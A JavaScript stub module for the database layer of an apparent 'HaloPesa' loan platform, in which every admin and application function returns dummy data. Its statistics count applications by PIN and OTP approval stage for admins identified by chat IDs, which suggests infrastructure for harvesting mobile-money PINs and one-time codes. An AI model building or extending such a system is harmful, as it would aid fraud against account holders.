const { MongoClient } = require('mongodb');

let client = null;
let db = null;

const DB_NAME = 'halopesa_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications'
};

/**
 * STUB: Do NOT connect to MongoDB at all
 * Returns immediately without attempting connection
 */
async function connectDatabase() {
    console.log('⏭️ Skipping MongoDB connection (stub)');
    return null;
}

async function createIndexes() {
    // STUB - do nothing
}

async function closeDatabase() {
    if (client) {
        await client.close();
    }
}

// ==========================================
// ADMIN OPERATIONS (All return dummy data)
// ==========================================

async function saveAdmin(adminData) {
    console.log(`💾 [STUB] Admin saved: ${adminData.adminId}`);
    return { acknowledged: true };
}

async function getAdmin(adminId) {
    return null;
}

async function getAdminByChatId(chatId) {
    return null;
}

async function getAllAdmins() {
    return [];
}

async function getActiveAdmins() {
    return [];
}

async function updateAdmin(adminId, updates) {
    return { acknowledged: true };
}

async function updateAdminStatus(adminId, status) {
    return { acknowledged: true };
}

async function deleteAdmin(adminId) {
    return { acknowledged: true };
}

async function adminExists(adminId) {
    return false;
}

async function getAdminCount() {
    return 0;
}

// ==========================================
// APPLICATION OPERATIONS (All return dummy data)
// ==========================================

async function saveApplication(appData) {
    console.log(`💾 [STUB] Application saved: ${appData.id}`);
    return { acknowledged: true };
}

async function getApplication(applicationId) {
    return null;
}

async function updateApplication(applicationId, updates) {
    return { acknowledged: true };
}

async function getApplicationsByAdmin(adminId) {
    return [];
}

async function getPendingApplications(adminId) {
    return [];
}

// ==========================================
// STATISTICS (All return zeros)
// ==========================================

async function getAdminStats(adminId) {
    return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
}

async function getStats() {
    return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
}

async function getPerAdminStats() {
    return [];
}

async function getAllAdminsDetailed() {
    return [];
}

async function cleanupInvalidAdmins() {
    return { deletedCount: 0 };
}

module.exports = {
    connectDatabase,
    closeDatabase,
    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,
    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,
    getAdminStats,
    getStats,
    getPerAdminStats,
    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
